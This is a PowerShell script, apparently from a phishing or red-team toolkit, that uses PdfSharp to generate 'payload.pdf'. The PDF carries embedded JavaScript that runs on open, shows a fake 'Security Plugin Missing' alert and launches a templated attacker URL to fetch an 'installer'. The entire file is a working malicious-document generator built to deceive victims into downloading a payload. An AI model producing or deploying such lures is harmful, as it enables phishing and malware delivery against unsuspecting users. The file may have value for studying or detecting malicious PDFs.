[string]$js = "app.alert('Security Plugin Missing, Launching installer');app.launchURL('{{BASE_URL}}&payload=PDF', false);"
[string]$msg = "Security Plugin FAIL"
[string]$filename = "payload.pdf"

Add-Type -Path WPF\PdfSharp-WPF.dll

$doc = New-Object PdfSharp.Pdf.PdfDocument
$doc.Info.Title = $js
$doc.info.Creator = "@hashem"
$page = $doc.AddPage()

$dictjs = New-Object PdfSharp.Pdf.PdfDictionary
$dictjs.Elements["/S"] = New-Object PdfSharp.Pdf.PdfName ("/JavaScript")
$dictjs.Elements["/JS"] = New-Object PdfSharp.Pdf.PdfStringObject($doc, $js);
$doc.Internals.AddObject($dictjs)

$dict = New-Object PdfSharp.Pdf.PdfDictionary
$pdfarray = New-Object PdfSharp.Pdf.PdfArray
$embeddedstring = New-Object PdfSharp.Pdf.PdfString("EmbeddedJS")

$dict.Elements["/Names"] = $pdfarray
$pdfarray.Elements.Add($embeddedstring)
$pdfarray.Elements.Add($dictjs.Reference)
$doc.Internals.AddObject($dict)

$dictgroup = New-Object PdfSharp.Pdf.PdfDictionary
$dictgroup.Elements["/JavaScript"] = $dict.Reference
$doc.Internals.Catalog.Elements["/Names"] = $dictgroup

$doc.Save($filename)
